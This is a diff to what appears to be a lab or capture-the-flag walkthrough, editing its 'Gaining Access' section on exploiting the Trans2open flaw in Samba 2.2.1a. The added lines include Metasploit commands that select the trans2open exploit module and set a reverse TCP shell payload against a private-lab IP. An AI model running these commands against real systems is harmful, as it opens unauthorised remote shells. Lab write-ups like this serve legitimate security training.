@@ -84,15 +84,23 @@ searchsploit samba 2.2.1a
 
 ## 3-Gaining Access
 
-- After identifying a known Trans2open vulnerability affecting the Samba version, we can use the corresponding exploit module in the Metasploit Framework.
+- After identifying a known **Trans2open** vulnerability affecting the Samba version, we can use the corresponding exploit module in the Metasploit Framework.
 
   ```bash
   sudo msfconsole
   use exploit/linux/samba/trans2open
   show options
+  set payload generic/shell_reverse_tcp 
   set rhosts 192.168.38.137
   run
   ```
+
+<img width="1006" height="707" alt="image" src="https://github.com/user-attachments/assets/ecc6db77-7f07-4857-9814-d0bb79f0dbde" />
+<img width="911" height="307" alt="image" src="https://github.com/user-attachments/assets/38ddd048-d29f-4375-a263-3be5c624be94" />
+
+**Note:** 
+
+
 
 
   
